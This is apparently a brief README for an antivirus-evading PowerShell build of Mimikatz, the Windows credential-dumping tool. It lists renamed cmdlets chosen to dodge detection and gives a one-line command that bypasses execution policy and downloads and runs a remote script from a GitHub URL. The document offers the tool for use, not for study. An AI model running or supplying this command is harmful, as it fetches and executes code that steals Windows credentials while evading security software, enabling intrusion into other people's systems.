# Mimikatz Powershell FUD

Build: mimikatz 2.2.0 (x64) #19041 Aug 10 2021 02:01:23<br>
Tested: Microsoft Windows 11 Pro - 10.0.22000 N/D Compilación 22000

## Cheats Cmdlets

Invoke-Mimikatz == Invoke-M1m1fud<br>
DumpCreds == Dump

IEX:

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/M1m1fud2/main/Invoke-M1m1fud2.ps1'))
